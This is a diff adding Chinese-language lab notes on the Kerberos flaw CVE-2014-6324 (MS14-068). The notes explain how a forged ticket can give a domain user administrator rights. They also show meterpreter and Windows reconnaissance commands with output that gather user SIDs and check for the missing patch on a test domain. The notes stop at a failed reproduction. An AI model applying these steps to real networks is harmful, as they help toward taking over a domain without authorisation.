@@ -1,0 +1,87 @@
+cve-2014-6324:
+影响版本： windows server 2003  ---  windows server 2012 R2
+
+利用:
+如果攻击者获取了域内任何一台计算机的shell权限  同时知道任意域内的用户名、SID、密码  即可获取域管理员权限
+
+漏洞产生原理:
+用户在向 Kerberos密钥分发中心(KDC) 申请 TGT(由票据授权服务产生的身份凭证) 时
+可以伪造自己的Kerberos票据
+如果票据声明自己有域管理员权限
+而KDC在处理该票据时未验证票据的签名
+那么 返回给用户的TGT就使普通域用户拥有了域管理员权限
+该用户可以将TGT发送到KDC
+KDC的TGS(票据授权服务)在验证了TGT后
+将服务票据发送给该用户
+而该用户拥有访问该服务的权限
+从而使攻击者可以访问域内的资源
+
+查看当前用户权限:
+meterpreter > getuid
+# Server username: WIN2008-USER\win2008host
+meterpreter > getsid
+# Server SID: S-1-5-21-4154266007-3477854183-4187878415-1000
+
+whoami /user   #机器账户
+# USER INFORMATION
+# ----------------
+# User Name                SID                                           
+# ======================== ==============================================
+# win2008-user\win2008host S-1-5-21-4154266007-3477854183-4187878415-1000
+
+net user /domain   #域用户
+# The request will be processed at a domain controller for domain momoda.com.
+# User accounts for \\WIN2012-AD.momoda.com
+# -------------------------------------------------------------------------------
+Administrator            Guest                    krbtgt                   
+starchen1                win2012host              
+# The command completed with one or more errors.
+
+查看补丁  ms14-068补丁为 KB3011780:
+wmic qfe get hotfixid
+# HotFixID  
+# KB976902
+机器没有打补丁
+
+获取域内所有用户的SID:
+wmic useraccount get name,sid
+# Name           SID                                             
+# Administrator  S-1-5-21-4154266007-3477854183-4187878415-500   
+# Guest          S-1-5-21-4154266007-3477854183-4187878415-501   
+# win2008host    S-1-5-21-4154266007-3477854183-4187878415-1000  
+# Administrator  S-1-5-21-1551850555-1081445987-312487512-500    
+# Guest          S-1-5-21-1551850555-1081445987-312487512-501    
+# krbtgt         S-1-5-21-1551850555-1081445987-312487512-502    
+# win2012host    S-1-5-21-1551850555-1081445987-312487512-1001   
+# starchen1      S-1-5-21-1551850555-1081445987-312487512-1107
+
+一直复现失败:
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
